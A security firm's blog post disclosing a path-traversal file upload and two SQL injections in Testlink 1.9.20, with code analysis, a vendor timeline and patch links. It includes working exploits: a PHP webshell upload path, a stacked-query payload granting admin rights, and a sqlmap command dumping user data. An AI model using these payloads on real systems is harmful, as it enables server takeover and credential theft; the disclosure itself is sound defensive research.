<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<title>Testlink 1.9.20: Unrestricted file upload and SQL injection - Ackcent</title>
	<link rel="icon" href="https://ackcent.com/wp-content/themes/ackcent/images/favicon.png">
	<script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5014bc53-124f-40d7-a8e0-c35e7c12d865" data-blockingmode="auto" type="text/javascript"></script>
	<link rel="alternate" hreflang="en" href="https://ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/"/>

	<!-- This site is optimized with the Yoast SEO plugin v15.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<meta name="description" content="Testlink is an open-source, web-based test management and test execution system written in PHP (a scripting language also known as a Hypertext Preprocessor)."/>
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
	<link rel="canonical" href="https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/"/>
	<meta property="og:locale" content="en_US"/>
	<meta property="og:type" content="article"/>
	<meta property="og:title" content="Testlink 1.9.20: Unrestricted file upload and SQL injection - Ackcent"/>
	<meta property="og:description" content="Testlink is an open-source, web-based test management and test execution system written in PHP (a scripting language also known as a Hypertext Preprocessor)."/>
	<meta property="og:url" content="https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/"/>
	<meta property="og:site_name" content="Ackcent"/>
	<meta property="article:published_time" content="2020-04-03T00:00:00+00:00"/>
	<meta property="article:modified_time" content="2020-05-29T07:03:02+00:00"/>
	<meta property="og:image" content="https://ackcent.com/wp-content/uploads/2020/04/vulnerability.jpeg"/>
	<meta property="og:image:width" content="1722"/>
	<meta property="og:image:height" content="923"/>
	<meta name="twitter:card" content="summary_large_image"/>
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Miguel Delgado">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="9 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/#website","url":"https://www-wordpress-thevoo6roh7taita.ackcent.com/","name":"Ackcent","description":"","potentialAction":[{"@type":"SearchAction","target":"https://www-wordpress-thevoo6roh7taita.ackcent.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/#primaryimage","inLanguage":"en-US","url":"https://ackcent.com/wp-content/uploads/2020/04/vulnerability.jpeg","width":1722,"height":923},{"@type":"WebPage","@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/#webpage","url":"https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/","name":"Testlink 1.9.20: Unrestricted file upload and SQL injection - Ackcent","isPartOf":{"@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/#website"},"primaryImageOfPage":{"@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/#primaryimage"},"datePublished":"2020-04-03T00:00:00+00:00","dateModified":"2020-05-29T07:03:02+00:00","author":{"@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/#/schema/person/61ada2aa80fa053461df846e71f1be8d"},"description":"Testlink is an open-source, web-based test management and test execution system written in PHP (a scripting language also known as a Hypertext Preprocessor).","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www-wordpress-thevoo6roh7taita.ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/"]}]},{"@type":"Person","@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/#/schema/person/61ada2aa80fa053461df846e71f1be8d","name":"Miguel Delgado","image":{"@type":"ImageObject","@id":"https://www-wordpress-thevoo6roh7taita.ackcent.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/4219472bb55d7d199ccceab10c739b3c?s=96&d=mm&r=g","caption":"Miguel Delgado"}}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//js.hs-scripts.com'/>
<link rel='dns-prefetch' href='//ajax.googleapis.com'/>
<link rel='dns-prefetch' href='//s.w.org'/>
<link rel='stylesheet' id='style-css' href='https://ackcent.com/wp-content/themes/ackcent/style.css?ver=5.6.5' type='text/css' media='all'/>
<link rel='shortlink' href='https://ackcent.com/?p=1374'/>
<meta name="generator" content="WPML ver:4.4.8 stt:1;"/>
			<!-- DO NOT COPY THIS SNIPPET! Start of Page Analytics Tracking for HubSpot WordPress plugin v7.50.12-->
			<script type="text/javascript">var _hsq=_hsq||[];_hsq.push(["setContentType","blog-post"]);</script>
			<!-- DO NOT COPY THIS SNIPPET! End of Page Analytics Tracking for HubSpot WordPress plugin -->
						<script>(function(){var hbspt=window.hbspt=window.hbspt||{};hbspt.forms=hbspt.forms||{};hbspt._wpFormsQueue=[];hbspt.enqueueForm=function(formDef){if(hbspt.forms&&hbspt.forms.create){hbspt.forms.create(formDef);}else{hbspt._wpFormsQueue.push(formDef);}}
if(!window.hbspt.forms.create){Object.defineProperty(window.hbspt.forms,'create',{configurable:true,get:function(){return hbspt._wpCreateForm;},set:function(value){hbspt._wpCreateForm=value;while(hbspt._wpFormsQueue.length){var formDef=hbspt._wpFormsQueue.shift();if(!document.currentScript){var formScriptId='leadin-forms-v2-js';hubspot.utils.currentScript=document.getElementById(formScriptId);}hbspt._wpCreateForm.call(hbspt.forms,formDef);}},});}})();</script>
			<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-175203410-1"></script>
	<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-175203410-1');</script>
	<!-- End Global site tag (gtag.js) - Google Analytics -->
	<!-- Google Tag Manager -->
	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-KPTS47B');</script>
	<!-- End Google Tag Manager -->
			<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
	</head>
<body class="post-template-default single single-post postid-1374 single-format-standard">
	<!-- Google Tag Manager (noscript) -->
	<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KPTS47B" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	<!-- End Google Tag Manager (noscript) -->
	<header class="main-header main-header--dark">
		<div class="main-header__container container flex-row flex-row--space flex-row--vcenter">
			<div class="main-header__logo-container">
				<a href="/" class="main-header__logo">
					<img class="main-header__logo--dark" src="https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg" alt="Ackcent">
					<img class="main-header__logo--light" src="https://ackcent.com/wp-content/uploads/2020/04/logo-light.svg" alt="Ackcent">
				</a>
			</div>
			<div class="main-header__menu-container">
				<ul id="menu-main-menu" class="main-menu menu"><li id="menu-item-153" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="#">Services</a>
<ul class="sub-menu">
	<li id="menu-item-745" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/attack-services/">Attack<br/><span class="sub">Discover. Prevent. Remediate</span></a></li>
	<li id="menu-item-744" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/detection-and-response-services/">Detection and response<br/><span class="sub">Monitor. Detect. Respond</span></a></li>
	<li id="menu-item-743" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/cybersecurity-services/">Cybersecurity<br/><span class="sub">Assess. Plan. Simplify</span></a></li>
</ul>
</li>
<li id="menu-item-152" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="#">Solutions</a>
<ul class="sub-menu">
	<li id="menu-item-1271" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/device-security/">Device<br/><span class="sub">Protect. Detect. Respond</span></a></li>
	<li id="menu-item-1269" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/applications-security/">Application<br/><span class="sub">Test. Validate. Improve</span></a></li>
	<li id="menu-item-767" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/cloud-security/">Cloud<br/><span class="sub">Prevent. Detect. Deploy</span></a></li>
	<li id="menu-item-1270" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/networks-security/">Network<br/><span class="sub">Prevent. Detect. Respond</span></a></li>
</ul>
</li>
<li id="menu-item-1698" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/blog/">Blog</a></li>
<li id="menu-item-3165" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/glossary/">Glossary</a></li>
</ul>			</div>
			<div class="main-header__button-container">
				<a class="button main-header__button" href="https://ackcent.com/start-now/">Start now</a>
			</div>
			<div class="responsive-menu-button">
				<span class="responsive-menu-button-line"></span>
				<span class="responsive-menu-button-line"></span>
				<span class="responsive-menu-button-line"></span>
			</div>
		</div>
	</header>
	<div class="responsive-menu">
		<a href="/" class="main-header__logo"><img class="main-header__logo--dark" src="https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg" alt="Ackcent"></a>
		<div class="responsive-menu-button--close">
			<span class="responsive-menu-button-line--dark"></span>
			<span class="responsive-menu-button-line--dark"></span>
		</div>
		<ul id="menu-main-menu-1" class="main-menu menu"><li id="menu-item-153" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="#">Services</a>
<ul class="sub-menu">
	<li id="menu-item-745" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/attack-services/">Attack<br/><span class="sub">Discover. Prevent. Remediate</span></a></li>
	<li id="menu-item-744" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/detection-and-response-services/">Detection and response<br/><span class="sub">Monitor. Detect. Respond</span></a></li>
	<li id="menu-item-743" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/cybersecurity-services/">Cybersecurity<br/><span class="sub">Assess. Plan. Simplify</span></a></li>
</ul>
</li>
<li id="menu-item-152" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="#">Solutions</a>
<ul class="sub-menu">
	<li id="menu-item-1271" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/device-security/">Device<br/><span class="sub">Protect. Detect. Respond</span></a></li>
	<li id="menu-item-1269" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/applications-security/">Application<br/><span class="sub">Test. Validate. Improve</span></a></li>
	<li id="menu-item-767" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/cloud-security/">Cloud<br/><span class="sub">Prevent. Detect. Deploy</span></a></li>
	<li id="menu-item-1270" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/networks-security/">Network<br/><span class="sub">Prevent. Detect. Respond</span></a></li>
</ul>
</li>
<li id="menu-item-1698" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/blog/">Blog</a></li>
<li id="menu-item-3165" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://ackcent.com/glossary/">Glossary</a></li>
</ul>		<a class="button main-header__button button--gray" href="https://ackcent.com/start-now/">Start now</a>
	</div>
<section class="blog-post">
	<div class="container">
					<div class="blog-post__progression-bar">
				<div class="blog-post__progression-bar-content">
					<div class="blog-post__progression-bar-logo-container">
						<a href="/"><img src="https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg" class="blog-post__progression-bar-logo"></a>
					</div>
					<p class="blog-post__progression-bar-title">Testlink 1.9.20: Unrestricted file upload and SQL injection</p>
					<div class="blog-post__progression-bar-sm">
						<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
						<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
						<a class="a2a_button_linkedin"></a>
						<a class="a2a_button_twitter"></a>
						<a class="a2a_button_facebook"></a>
						</div>
						<script async src="https://static.addtoany.com/menu/page.js"></script>
					</div>
				</div>
				<div class="blog-post__progression-bar-progression"></div>
			</div>
			<div class="blog-post-header">
		        <div class="blog-post-header__container flex-row flex-row--space flex-row--wrap">
                     <div class="blog-post-header__info">
                       <h1 class="blog__title title-section title-section--left">Testlink 1.9.20: Unrestricted file upload and SQL injection</h1> 
                    </div>
                    <div class="blog-featured-post__image-container">
	       				<img width="1722" height="923" src="https://ackcent.com/wp-content/uploads/2020/04/vulnerability.jpeg" class="blog__thumbnail wp-post-image" alt="Testlink 1.9.20: Unrestricted file upload and SQL injection" loading="lazy" srcset="https://ackcent.com/wp-content/uploads/2020/04/vulnerability.jpeg 1722w, https://ackcent.com/wp-content/uploads/2020/04/vulnerability-300x161.jpeg 300w, https://ackcent.com/wp-content/uploads/2020/04/vulnerability-1024x549.jpeg 1024w, https://ackcent.com/wp-content/uploads/2020/04/vulnerability-768x412.jpeg 768w, https://ackcent.com/wp-content/uploads/2020/04/vulnerability-1536x823.jpeg 1536w" sizes="(max-width: 1722px) 100vw, 1722px"/>                    </div>
		        </div>
			</div>
			 <div class="blog-post-author-bar">
								<div class="blog-post-author-bar__left">
					<span class="blog-post__info-date">April 03, 2020</span>
					<span class="blog-post__info-author-name">
												   By <span>Miguel Delgado</span>
											</span>
				</div>
				<div class="blog-post-progression-bar__right">
					<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
					<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
					<a class="a2a_button_linkedin"></a>
					<a class="a2a_button_twitter"></a>
					<a class="a2a_button_facebook"></a>
					</div>
					<script async src="https://static.addtoany.com/menu/page.js"></script>
				</div>
			</div>
				<div class="blog-post__container">
			<div class="blog-post__content cpt-content">
<p><a href="http://testlink.org/">Testlink</a> is an open-source, web-based test management and test execution system written in PHP (a scripting language also known as a <strong>Hypertext Preprocessor</strong>). During a recent security audit, our AppSec team found an unrestricted file upload (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8639">CVE-2020-8639</a>) and two SQL Injection vulnerabilities (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8637">CVE-2020-8637</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8638">CVE-2020-8638</a>). Below we provide an in-depth overview of the three identified flaws and ways they can be exploited.</p>



<h2 id="unrestricted-file-upload-technical-analysis">Unrestricted file upload: Technical Analysis</h2>



<p>Teslink offers the possibility to categorize test cases using keywords. These keywords can be exported and imported, and in this operation, we found our first vulnerability.</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/image-28.jpg" alt="" class="wp-image-1466" width="534" height="279" srcset="https://ackcent.com/wp-content/uploads/2020/05/image-28.jpg 492w, https://ackcent.com/wp-content/uploads/2020/05/image-28-300x157.jpg 300w" sizes="(max-width: 534px) 100vw, 534px"/></figure></div>



<p>This screen allows us to upload a file containing keywords, and by selecting the <code>File type</code> we can choose between XML or CSV format. Let’s now look at the implementation of the init_args method in the file <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/keywords/keywordsImport.php">keywordsImport.php</a></p>



<pre class="wp-block-code"><code>function init_args(&amp;$dbHandler)
{
  $_REQUEST = strings_stripSlashes($_REQUEST);
  $ipcfg = array("UploadFile" => array(tlInputParameter::STRING_N,0,1),
                 "importType" => array(tlInputParameter::STRING_N,0,100),
                 "tproject_id" => array(tlInputParameter::INT_N));
  $args = new stdClass();
  R_PARAMS($ipcfg,$args);
  if( $args->tproject_id &lt;= 0 )
  {
    throw new Exception(" Error Invalid Test Project ID", 1);
  }
  // Check rights before doing anything else
  // Abort if rights are not enough
  $user = $_SESSION&#91;'currentUser'];
  $env&#91;'tproject_id'] = $args->tproject_id;
  $env&#91;'tplan_id'] = 0;
  $check = new stdClass();
  $check->items = array('mgt_modify_key');
  $check->mode = 'and';
  checkAccess($dbHandler,$user,$env,$check);
  $tproj_mgr = new testproject($dbHandler);
  $dm = $tproj_mgr->get_by_id($args->tproject_id,array('output' => 'name'));
  $args->tproject_name = $dm&#91;'name'];
  $args->UploadFile = ($args->UploadFile != "") ? 1 : 0;
  $args->fInfo = isset($_FILES&#91;'uploadedFile']) ? $_FILES&#91;'uploadedFile'] : null;
  $args->source = isset($args->fInfo&#91;'tmp_name']) ? $args->fInfo&#91;'tmp_name'] : null;
  $args->dest = TL_TEMP_PATH . session_id() . "-importkeywords." . $args->importType;
  return $args;
}</code></pre>



<p>First, the <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/common.php#L547">strings_stripSlashes</a> method un-quotes all quoted-string values from <code>$_REQUEST</code>. Then with the <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/inputparameter.inc.php#L99">R_PARAMS</a> method, the parameters defined in <code>$ipcfg</code> are retrieved from the <code>REQUEST</code> and stored in <code>$args</code>. The uploaded file is stored in <code>$args-&gt;source</code> and the value of <code>$args-&gt;importType</code> is concatenated in <code>$args-&gt;dest</code>. There is nothing to stop us from changing the value of <code>importType</code> to <code>/../../any/folder/we/want</code>. In other words, this parameter is vulnerable to Path Traversal.</p>



<p>Now let’s see where <code>$args-&gt;dest</code> is used:</p>



<pre class="wp-block-code"><code>$args = init_args($db);
$gui = initializeGui($args);
if(!$gui->msg &amp;&amp; $args->UploadFile)
{
  if(($args->source != 'none') &amp;&amp; ($args->source != ''))
  {
    if (move_uploaded_file($args->source, $args->dest))</code></pre>



<p>It is used in <a href="https://www.php.net/manual/en/function.move-uploaded-file.php">move_uploaded_file</a> so we can upload a file in any directory of the server.</p>



<h2 id="unrestricted-file-upload-exploit">Unrestricted file upload: Exploit</h2>



<p>One way to exploit this vulnerability would be to upload a webshell to have Remote Code Execution on the server where Testlink is deployed. To do this we need to locate a path on the server that the system user running Testlink has write permissions for (for example, /logs).</p>



<p>The value of <code>importType</code> should be <code>/../../../logs/ws.php</code> and we need to pass the code of our webshell in the variable <code>uploadedFile</code> in PHP. For example, this can be done in the following way:</p>



<pre class="wp-block-code"><code>&lt;html>
    &lt;body>
        &lt;form method="POST">
            &lt;input name="command" id="command" />
            &lt;input type="submit" value="Send" />
        &lt;/form>
        &lt;pre>
            &lt;?php if(isset($_POST&#91;'command']))
        {
            system($_POST&#91;'command']);
        } ?>
        &lt;/pre>
    &lt;/body>
&lt;/html></code></pre>



<p>This way we can execute code on the server:</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/webshell.png" alt="Webshell" class="wp-image-1877" width="495" height="125" srcset="https://ackcent.com/wp-content/uploads/2020/05/webshell.png 458w, https://ackcent.com/wp-content/uploads/2020/05/webshell-300x75.png 300w" sizes="(max-width: 495px) 100vw, 495px"/></figure></div>



<h2 id="sql-injection-technical-analysis">SQL Injection: Technical Analysis</h2>



<p>Testlink is vulnerable to SQL Injection, both in <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/tree.class.php">tree.class.php</a> and <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/testPlanUrgency.class.php">testPlanUrgency.class.php</a>.</p>



<p>Let’s look at each of the SQL injection in detail. The flow of the first one starts in <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/ajax/dragdroptreenodes.php">dragdroptreenodes.php</a>, the injection is done in the unsanitized parameter <code>nodeid</code>.</p>



<p>The following code snippet shows the entry point to the vulnerability:</p>



<pre class="wp-block-code"><code>function init_args()
{
  $args=new stdClass();
  $key2loop=array('nodeid','newparentid','doAction','top_or_bottom','nodeorder','nodelist');
  foreach($key2loop as $key)
  {
    $args->$key=isset($_REQUEST&#91;$key]) ? $_REQUEST&#91;$key] : null;
  }
  return $args;
}</code></pre>



<p>The user input <code>nodeid</code> is retrieved from the <code>$_REQUEST</code> and stored in <code>$args-&gt;nodeid</code>. The <code>change_parent</code> method is then invoked:</p>



<pre class="wp-block-code"><code>$args=init_args();
$treeMgr = new tree($db);
switch($args->doAction)
{
    case 'changeParent':
        $treeMgr->change_parent($args->nodeid,$args->newparentid);
    break;</code></pre>



<p>The method definition is in <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/tree.class.php">tree.class.php</a></p>



<pre class="wp-block-code"><code>  function change_parent($node_id, $parent_id)
  {
    $debugMsg='Class:' .__CLASS__ . ' - Method:' . __FUNCTION__ . ' :: ';
    if( is_array($node_id) )
    {
      $id_list = implode(",",$node_id);
      $where_clause = " WHERE id IN ($id_list) ";
    }
    else
    {
      $where_clause=" WHERE id = {$node_id}";
    }
    $sql = "/* $debugMsg */ UPDATE {$this->object_table} " .
           " SET parent_id = " . $this->db->prepare_int($parent_id) . " {$where_clause}";
    $result = $this->db->exec_query($sql);
    return $result ? 1 : 0;
  }
</code></pre>



<p>As you can see in the source code, the <code>$node_id</code> is concatenated in the <code>WHERE</code> of the SQL statement, enabling the manipulation of the SQL syntax.</p>



<p>The second SQL injection starts in <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/plan/planUrgency.php">planUrgency.php</a> the injection is done in the unsanitized parameter <code>urgency</code>.</p>



<pre class="wp-block-code"><code>  if (isset($_REQUEST&#91;'urgency']))
  {
    $args->urgency_tc = $_REQUEST&#91;'urgency'];
  }</code></pre>



<p>After retrieving the <code>urgency</code> value of <code>$_REQUEST</code>, the <code>setTestUrgency</code> method is called.</p>



<pre class="wp-block-code"><code>  // Set urgency for individual testcases
  if(isset($argsObj->urgency_tc))
  {
    foreach ($argsObj->urgency_tc as $id => $urgency)
    {
      $tplanMgr->setTestUrgency($argsObj->tplan_id, $id, $urgency);
    }
  }
</code></pre>



<p>The definition of the <code>setTestUrgency</code> method can be found at <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/testPlanUrgency.class.php">testPlanUrgency.class.php</a>.</p>



<pre class="wp-block-code"><code>  public function setTestUrgency($testplan_id, $tc_id, $urgency)
  {
    $sql = " UPDATE {$this->tables&#91;'testplan_tcversions']} SET urgency={$urgency} " .
           " WHERE testplan_id=" . $this->db->prepare_int($testplan_id) .
           " AND tcversion_id=" . $this->db->prepare_int($tc_id);
    $result = $this->db->exec_query($sql);
    return $result ? tl::OK : tl::ERROR;
  }</code></pre>



<p>Finally <code>$urgency</code> is directly embedded into a SQL query, allowing an attacker to control the SQL statement that will be executed in the database.</p>



<h2 id="sql-injection-technical-analysis-exploit">SQL Injection: Technical Analysis: Exploit</h2>



<p>Teslink can be installed to use MySQL or PostgreSQL. If it is using MySQL, an attacker can list sensitive database information. But if it is using PostgreSQL, since it allows stacked queries, it permits any attacker to execute malicious queries on the server’s database.</p>





<h3 id="postgresql-environment">PostgreSQL environment</h3>



<p>This is the best scenario in an attacker’s perspective, because he can just execute any SQL query, only adding a <code>;</code> followed by the query he wants to execute and finally a <code>--</code> to comment on the rest of the query.</p>



<p>For example, we could make an account with a Guest role to become an Admin.</p>



<p>If we look at the script that populates the roles data in <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/install/sql/postgres/testlink_create_default_data.sql">testlink_create_default_data.sql</a>, we can see that the Role with id <code>8</code> is the Admin</p>



<pre class="wp-block-code"><code># Roles -
INSERT INTO /*prefix*/roles  (id,description) VALUES (1, '&lt;reserved system role 1>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (2, '&lt;reserved system role 2>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (3, '&lt;no rights>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (4, 'test designer');
INSERT INTO /*prefix*/roles  (id,description) VALUES (5, 'guest');
INSERT INTO /*prefix*/roles  (id,description) VALUES (6, 'senior tester');
INSERT INTO /*prefix*/roles  (id,description) VALUES (7, 'tester');
INSERT INTO /*prefix*/roles  (id,description) VALUES (8, 'admin');
INSERT INTO /*prefix*/roles  (id,description) VALUES (9, 'leader');

Knowing this we can build the following payload to update the role_id of the user in the users table.</code></pre>



<p>Knowing this we can build the following payload to update the <code>role_id</code> of the user in the <code>users</code> table.</p>



<pre class="wp-block-code"><code>nodeid=47; update users set role_id='8' where login='user';--</code></pre>



<p>Before executing the payload the user only has Guest rights:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="958" height="285" src="https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/user3.png" alt="Guest user" class="wp-image-1879" srcset="https://ackcent.com/wp-content/uploads/2020/05/user3.png 958w, https://ackcent.com/wp-content/uploads/2020/05/user3-300x89.png 300w, https://ackcent.com/wp-content/uploads/2020/05/user3-768x228.png 768w" sizes="(max-width: 958px) 100vw, 958px"/></figure></div>



<p>After running our payload, the user becomes Admin and has all the respective permissions:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="934" height="571" src="https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/user4.png" alt="Guest user" class="wp-image-1881" srcset="https://ackcent.com/wp-content/uploads/2020/05/user4.png 934w, https://ackcent.com/wp-content/uploads/2020/05/user4-300x183.png 300w, https://ackcent.com/wp-content/uploads/2020/05/user4-768x470.png 768w" sizes="(max-width: 934px) 100vw, 934px"/></figure>



<h3 id="mysql-environment">MySQL environment</h3>



<p>In this scenario, since no stacked queries are allowed, we cannot change the database values, but we can dump their data.</p>



<p>To automate the process we can use the  <a href="http://sqlmap.org/">sqlmap</a> tool. For instance, if we wanted to dump the data from the users table, we would have to execute the following command:</p>



<pre class="wp-block-code"><code>python sqlmap.py -u &lt;URL_TESTLINK>/lib/ajax/dragdroptreenodes.php
--data="doAction=changeParent&amp;oldparentid=41&amp;newparentid=41&amp;nodelist=47%2C45&amp;nodeorder=0&amp;nodeid=47"
-p nodeid
--cookie="PHPSESSID=&lt;PHP_SESSION_ID>; TESTLINK1920TESTLINK_USER_AUTH_COOKIE=&lt;USER_AUTH_COOKIE>"
--dump -D testlink -T users</code></pre>



<p>The purpose of this blog post is not to explain how to use sqlmap, so we will just briefly explain the arguments we have passed to this command: </p>



<ul><li>u -&gt; target URL, in our case is one of the SQL Injections we have previously found</li><li>data -&gt;  data string to be sent through POST</li><li>p -&gt; testable parameter, in our case we know it is the nodeid</li><li>cookie -&gt; HTTP Cookie header value</li><li>dump -&gt; dump DBMS database table entries</li><li>D -&gt; database name</li><li>T -&gt; table name</li></ul>



<p>With these arguments we make sqlmap focus on what we want, making it take less time and launching fewer requests against the server.</p>



<p>The output of the sqlmap is:</p>



<pre class="wp-block-code"><code>web application technology: Apache 2.4.41, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
Database: testlink
Table: users
&#91;2 entries]
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+
| id | role_id | email         | login | password         | script_key        | cookie_string        |
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+
| 1  | 8       | admin@a.com   | admin | $2y$10$9 ... L/e | d4aed7db45 ... a5 | 517372818f771 ... 94 |
| 2  | 5       | user@a.com    | user  | $2y$10$8 ... YPW | NULL              | 9deab133cb5f7 ... 6a |
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+
</code></pre>



<p>When we analyze the sqlmap output, we can see that Testlink uses bcrypt to store users’ passwords so we can’t do anything with this information. However, it stores the apiKey and cookie in clear text, so we can use them to make requests as Admin.</p>



<h2 id="conclusions">Conclusions</h2>



<p>In this blog post, we have seen why it is so important to never trust the data provided by a user. Data from all potentially unreliable sources should be subject to input validation and these three vulnerabilities could have been avoided by applying correct input data validations.</p>



<p>In the case of the Unrestricted file upload vulnerability, we want to emphasize the importance of conducting a static analysis, because this kind of vulnerabilities can easily be overlooked in a dynamic analysis, but it is much easier and faster to detect it by checking the source code.</p>



<h2 id="timeline">Timeline</h2>



<figure class="wp-block-table"><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>31/1/2020</td><td>First contact with vendor</td></tr><tr><td>5/2/2020</td><td>Commits of correct patch (<a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/57d81ae350d569c5c95087997fe051c49e14516d">#1</a>, <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/d99bd8277d384f3417e917ce20bef5d061110343">#2</a> , <a href="https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05">#3</a>)</td></tr><tr><td>25/2/2020</td><td>We ask the vendor when the new version with the fixes will be released</td></tr><tr><td>27/2/2020</td><td>Vendor indicates that there is not going to be a new release, users should download the branch testlink_1_9_20_fixed</td></tr></tbody></table></figure>
</div>
					</div>
					<div class="blog-related-content">
			    <h4 class="blog-related-content__title"><strong>Keep Reading:</strong> related stories</h4>
